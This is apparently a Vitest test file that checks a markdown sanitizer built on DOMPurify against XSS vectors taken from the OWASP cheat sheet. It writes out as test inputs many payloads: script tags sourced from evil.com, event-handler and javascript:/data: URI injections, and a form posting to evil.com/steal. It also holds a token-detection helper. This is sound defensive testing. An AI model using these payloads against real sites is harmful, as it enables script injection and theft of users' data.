// XSS battery for lib/markdown.ts.
//
// Per CLAUDE.md: "Sanitize all admin-edited HTML with DOMPurify before
// storing." This module is the only place admin-edited markdown gets
// converted to HTML for rendering — both server (on save) and client
// (preview) call markdownToHtml. A bypass here is an XSS that hits
// every viewer of the rules / about page.
//
// We exercise the canonical attack vectors from OWASP's XSS filter
// evasion cheat sheet plus a few platform-specific gotchas:
//   - script tags (inline + sourced)
//   - HTML event handlers (onerror, onload, onclick, etc.)
//   - javascript: + data: URI schemes in href
//   - iframe / embed / object
//   - meta refresh redirect
//   - style tag with expression() / @import
//   - svg-borne XSS (svg + onload, svg + use href)
//   - polyglot encoded payloads
//   - allowed tags survive
//   - allowed attributes survive
//
// We also lock the contract: only tags in ALLOWED_TAGS pass through;
// only attributes in ALLOWED_ATTR pass through.

import { describe, expect, it } from "vitest";
import { markdownToHtml, markdownToText } from "@/lib/markdown";

// Helper: detect any of the canonical XSS-attack tokens in output.
// Used to lock the negative case ("must not pass through").
//
// Important: an attribute pattern like " onerror=" only matters when
// it appears INSIDE a real tag — text content with the literal string
// "onerror" (e.g. inside an &lt;-escaped h1) is harmless. We use a
// regex that requires `<tag ... onWORD=` to call out an executable
// event handler.
function isClean(html: string): boolean {
  const lower = html.toLowerCase();
  // Event handler as attribute on a real element.
  if (/<[a-z][^<>]*\son\w+\s*=/i.test(html)) return false;
  return (
    !lower.includes("<script") &&
    !lower.includes("javascript:") &&
    !lower.includes("<iframe") &&
    !lower.includes("<embed") &&
    !lower.includes("<object") &&
    !lower.includes("<form") &&
    !lower.includes("<meta") &&
    !lower.includes("<svg") &&
    !lower.includes("<style") &&
    !lower.includes("<link") &&
    !lower.includes("<base")
  );
}

describe("markdownToHtml — script tags", () => {
  it("strips inline <script>", () => {
    const html = markdownToHtml(
      "Hi\n\n<script>alert('pwned')</script>\n\nbye",
    );
    expect(isClean(html)).toBe(true);
    expect(html).not.toContain("alert");
  });

  it("strips <script src=external>", () => {
    const html = markdownToHtml(
      "<script src='https://evil.com/x.js'></script>",
    );
    expect(isClean(html)).toBe(true);
  });

  it("strips uppercase <SCRIPT> too", () => {
    const html = markdownToHtml("<SCRIPT>alert(1)</SCRIPT>");
    expect(isClean(html)).toBe(true);
  });

  it("strips <script> with weird whitespace + attributes", () => {
    const html = markdownToHtml(
      `<script\n  type="text/javascript"\n  >alert(1)</script\n>`,
    );
    expect(isClean(html)).toBe(true);
  });

  it("strips obfuscated <scr<script>ipt>", () => {
    const html = markdownToHtml("<scr<script>ipt>alert(1)</script>");
    expect(isClean(html)).toBe(true);
  });
});

describe("markdownToHtml — event handlers", () => {
  it("strips onerror on <img>", () => {
    const html = markdownToHtml(
      "<img src=x onerror=\"alert('xss')\">",
    );
    expect(isClean(html)).toBe(true);
    expect(html).not.toContain("alert");
  });

  it("strips onclick on a link", () => {
    const html = markdownToHtml(
      `<a href="#" onclick="alert(1)">click</a>`,
    );
    expect(isClean(html)).toBe(true);
  });

  it("strips onload on <body> / <svg>", () => {
    const html = markdownToHtml(
      `<svg onload="alert(1)"></svg><body onload="alert(2)"></body>`,
    );
    expect(isClean(html)).toBe(true);
  });

  it("strips onerror with whitespace tricks", () => {
    const html = markdownToHtml(
      "<img src=x \n   onerror\n=\nalert(1)>",
    );
    expect(isClean(html)).toBe(true);
  });

  it("strips onpointerover (less-common handler)", () => {
    const html = markdownToHtml(
      `<a href="x" onpointerover="alert(1)">a</a>`,
    );
    expect(isClean(html)).toBe(true);
  });
});

describe("markdownToHtml — dangerous URI schemes", () => {
  it("strips javascript: URLs in markdown links", () => {
    const html = markdownToHtml("[click me](javascript:alert(1))");
    // marked may emit <a> but DOMPurify must strip the href OR the
    // whole element. We just require the dangerous string not to
    // survive into rendered HTML.
    expect(html.toLowerCase()).not.toContain("javascript:");
  });

  it("strips javascript: URLs in raw <a href>", () => {
    const html = markdownToHtml(
      `<a href="javascript:alert(1)">click</a>`,
    );
    expect(html.toLowerCase()).not.toContain("javascript:");
  });

  it("strips data: HTML payloads in href", () => {
    const html = markdownToHtml(
      `<a href="data:text/html,<script>alert(1)</script>">click</a>`,
    );
    expect(html.toLowerCase()).not.toContain("data:text/html");
    expect(isClean(html)).toBe(true);
  });

  it("preserves http / https / mailto / # / relative URLs", () => {
    const html = markdownToHtml(
      `[1](https://leagueengine.com) [2](http://x.com) ` +
        `[3](mailto:a@b.com) [4](/rules) [5](#section)`,
    );
    expect(html).toContain("leagueengine.com");
    expect(html).toContain("mailto:");
    expect(html).toContain("/rules");
    expect(html).toContain("#section");
  });
});

describe("markdownToHtml — iframe / embed / object / form", () => {
  it("strips <iframe>", () => {
    const html = markdownToHtml(
      `<iframe src="https://evil.com"></iframe>`,
    );
    expect(isClean(html)).toBe(true);
  });

  it("strips <embed>", () => {
    const html = markdownToHtml(
      `<embed src="x.swf" type="application/x-shockwave-flash">`,
    );
    expect(isClean(html)).toBe(true);
  });

  it("strips <object>", () => {
    const html = markdownToHtml(
      `<object data="x.html"></object>`,
    );
    expect(isClean(html)).toBe(true);
  });

  it("strips <form>", () => {
    const html = markdownToHtml(
      `<form action="https://evil.com/steal"><input name="x"></form>`,
    );
    expect(isClean(html)).toBe(true);
    expect(html).not.toContain("<input");
  });
});

describe("markdownToHtml — meta / style / svg / link", () => {
  it("strips <meta http-equiv=refresh>", () => {
    const html = markdownToHtml(
      `<meta http-equiv="refresh" content="0;url=https://evil.com">`,
    );
    expect(isClean(html)).toBe(true);
  });

  it("strips <style> with @import / expression", () => {
    const html = markdownToHtml(
      `<style>@import url('https://evil.com/x.css');\n` +
        `body { background: expression(alert(1)); }</style>`,
    );
    expect(isClean(html)).toBe(true);
    expect(html).not.toContain("@import");
    expect(html).not.toContain("expression");
  });

  it("strips <svg> entirely (preventing svg-borne XSS)", () => {
    const html = markdownToHtml(
      `<svg><use href="data:image/svg+xml;base64,..."/></svg>`,
    );
    expect(isClean(html)).toBe(true);
  });

  it("strips <link rel=stylesheet>", () => {
    const html = markdownToHtml(
      `<link rel="stylesheet" href="https://evil.com/x.css">`,
    );
    expect(isClean(html)).toBe(true);
  });

  it("strips <base href> (rebase URL attack)", () => {
    const html = markdownToHtml(
      `<base href="https://evil.com/">`,
    );
    expect(isClean(html)).toBe(true);
  });
});

describe("markdownToHtml — polyglot + encoded payloads", () => {
  it("strips HTML-entity-encoded script", () => {
    const html = markdownToHtml(
      "&lt;script&gt;alert(1)&lt;/script&gt;",
    );
    // After parsing, &lt; renders as literal '<' in text, but it's
    // inside text content so it's escaped on output. The string
    // "alert(1)" can survive as plain text — that's fine. What we
    // require: no actual <script> tag appears in the output.
    expect(html.toLowerCase()).not.toMatch(/<script[\s>]/);
  });

  it("strips IE-style conditional comments", () => {
    const html = markdownToHtml(
      `<!--[if IE]><script>alert(1)</script><![endif]-->`,
    );
    expect(isClean(html)).toBe(true);
  });

  it("strips mixed-case + null-byte payloads", () => {
    const html = markdownToHtml(
      `<ScRiPt >alert(1)</ScRiPt>`,
    );
    expect(isClean(html)).toBe(true);
  });
});

describe("markdownToHtml — allowed content survives", () => {
  it("standard markdown headers + paragraphs survive", () => {
    const html = markdownToHtml(
      "# Title\n\n## Subtitle\n\nA paragraph with **bold** and _italic_.",
    );
    expect(html).toMatch(/<h1[^>]*>Title<\/h1>/);
    expect(html).toMatch(/<h2[^>]*>Subtitle<\/h2>/);
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain("<em>italic</em>");
  });

  it("links to safe URLs survive", () => {
    const html = markdownToHtml(
      "Visit [our site](https://leagueengine.com).",
    );
    expect(html).toMatch(/<a[^>]+href="https:\/\/leagueengine\.com"/);
  });

  it("ordered + unordered lists survive", () => {
    const html = markdownToHtml(
      "- one\n- two\n\n1. first\n2. second\n",
    );
    expect(html).toContain("<ul>");
    expect(html).toContain("<ol>");
    expect(html).toContain("<li>one</li>");
  });

  it("tables survive", () => {
    const html = markdownToHtml(
      "| col1 | col2 |\n|------|------|\n| a    | b    |\n",
    );
    expect(html).toContain("<table>");
    expect(html).toContain("<th>");
    expect(html).toContain("<td>");
  });

  it("blockquote + code + hr survive", () => {
    const html = markdownToHtml(
      "> quote\n\n`inline code`\n\n```\nblock\ncode\n```\n\n---\n",
    );
    expect(html).toContain("<blockquote>");
    expect(html).toContain("<code>");
    expect(html).toContain("<pre>");
    expect(html).toContain("<hr>");
  });

  it("disallowed attributes are dropped from allowed tags", () => {
    // <a> survives but the onclick attribute is dropped.
    const html = markdownToHtml(
      `<a href="https://x.com" onclick="alert(1)" id="dangerous-id">link</a>`,
    );
    expect(html).toContain('href="https://x.com"');
    expect(html.toLowerCase()).not.toContain("onclick");
    // 'id' is not in ALLOWED_ATTR (just href, title, target, rel).
    expect(html).not.toContain('id="dangerous-id"');
  });
});

describe("markdownToText — strips all HTML", () => {
  it("returns plain text from a structured document", () => {
    const text = markdownToText(
      "# Title\n\nA **bold** paragraph with [a link](https://x.com).",
    );
    expect(text).not.toContain("<");
    expect(text).not.toContain(">");
    expect(text).toContain("Title");
    expect(text).toContain("bold");
    expect(text).toContain("a link");
  });

  it("returns empty-ish from pure XSS payload", () => {
    const text = markdownToText(
      "<script>alert(1)</script><iframe></iframe>",
    );
    // After sanitization the dangerous tags are gone; text is what
    // survives. Just verify no script content leaks.
    expect(text).not.toContain("<script");
    expect(text).not.toContain("<iframe");
  });

  it("collapses whitespace", () => {
    const text = markdownToText("# Hi\n\n\n\n\nthere");
    expect(text).toBe("Hi there");
  });
});
